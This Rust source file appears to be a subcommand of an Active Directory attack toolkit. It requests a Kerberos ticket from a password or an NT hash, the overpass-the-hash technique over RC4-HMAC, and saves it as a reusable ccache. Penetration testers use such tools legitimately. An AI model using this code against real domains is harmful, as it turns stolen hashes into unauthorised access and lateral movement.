//! Ask-TGT: obtain a Kerberos TGT with password or NT hash (overpass-the-hash)
//! and write a reusable MIT ccache for `-k` workflows.

use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct AsktgtArgs {
    /// Username (sAMAccountName)
    #[arg(long)]
    pub user: String,
    /// Kerberos realm, e.g. CORP.LOCAL
    #[arg(long)]
    pub realm: String,
    /// KDC `host[:port]`
    #[arg(long)]
    pub kdc: String,
    /// Password auth (AES256). Mutually exclusive with --nt-hash.
    #[arg(long)]
    pub password: Option<String>,
    /// NT hash (32 hex) → overpass-the-hash via RC4-HMAC (legacy / RC4-enabled DCs).
    #[arg(long)]
    pub nt_hash: Option<String>,
    /// Output ccache path (defaults to `<user>.ccache`)
    #[arg(long)]
    pub out: Option<String>,
}

/// Ask-TGT: obtain a TGT with a password and write a reusable MIT ccache.
pub(crate) async fn asktgt(a: AsktgtArgs) -> Result<()> {
    let ccache = match (&a.nt_hash, &a.password) {
        (Some(h), None) => {
            let nt = crate::parse_nt_hash(h)?;
            println!("[*] overpass-the-hash (RC4-HMAC) for {}", a.user);
            adhammer_kerberos::overpass_the_hash(&a.user, &a.realm, &a.kdc, &nt).await?
        }
        (None, Some(pw)) => adhammer_kerberos::asktgt(&a.user, &a.realm, &a.kdc, pw).await?,
        _ => anyhow::bail!("provide exactly one of --password or --nt-hash"),
    };
    let out = a.out.unwrap_or_else(|| format!("{}.ccache", a.user));
    std::fs::write(&out, &ccache)?;
    println!(
        "[+] TGT obtained for {} → {out} ({} bytes)",
        a.user,
        ccache.len()
    );
    println!("    export KRB5CCNAME={out}  (use with Kerberos-aware tooling)");
    Ok(())
}
